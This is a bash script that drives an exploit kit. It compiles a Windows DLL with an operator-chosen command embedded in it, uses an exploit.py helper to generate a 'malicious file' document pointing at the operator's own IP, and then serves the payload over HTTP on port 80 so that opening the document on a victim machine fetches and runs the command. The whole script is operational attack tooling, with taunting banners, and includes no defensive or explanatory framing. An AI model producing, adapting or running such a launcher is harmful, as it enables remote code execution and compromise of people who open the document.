#!/bin/bash

# Constant for colorfull strings
RED='\033[0;31m'
NC='\033[0m' # No Color
echo -e "${RED}########################love#######################${NC}"
echo -e "${RED}########################degistirdim#######################${NC}"


if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

#check if required package installed
REQUIRED_PKG="lcab"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo "Checking for $REQUIRED_PKG: $PKG_OK"
if [ "" = "$PKG_OK" ]; then
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  sudo apt-get --yes install $REQUIRED_PKG
fi

#check if required compile package installed
REQUIRED_PKG="mingw-w64"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
echo "Checking for $REQUIRED_PKG: $PKG_OK"
if [ "" = "$PKG_OK" ]; then
  echo "No $REQUIRED_PKG. Setting up $REQUIRED_PKG."
  sudo apt-get --yes install $REQUIRED_PKG
fi


while getopts ":i:d:c:" opt; do
  case $opt in
    i) arg_interface="$OPTARG"
    ;;
    d) arg_dll="$OPTARG"
    ;;
    c) arg_command="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    ;;
  esac
done

if [[ $# -ne 4 ]]; then
    echo "Illegal number of parameters." 
    echo "You need to either give me dll file or command"
    echo "usage : sudo $0 -i <interface> [-d <dll>] [-c <command>]"
    exit
fi


if [ -z ${arg_command+x} ]; 
then 
echo -e "${RED}So you dont want me to compile ha!?${NC}"; 
else 
echo -e "${RED}so you want me to do job for ya!!!???${NC}"

#replace part of dll code
#command_to_execute in dll_generator
replace "command_to_execute" "$arg_command" -- dll_generator.c

#generate dll
i686-w64-mingw32-gcc -shared dll_generator.c -o dll_generator.dll

echo -e "${RED}i will repair generator now!!${NC}"
#repair dll_generator
replace  "$arg_command" "command_to_execute" -- dll_generator.c
arg_dll="dll_generator.dll"
fi

#get interface ip
iip=`ifconfig $arg_interface | grep "inet.*netmask" -o | cut -d " " -f 2`

#generate doc file
echo -e "${RED}malicious file is generating${NC}"
python3 exploit.py generate $arg_dll http://$iip
echo -e "${RED}malicious file generated!!${NC}"


echo -e "${RED}server is starting${NC}"
sudo python3 exploit.py host 80
echo -e "${RED}server is shutting down${NC}"


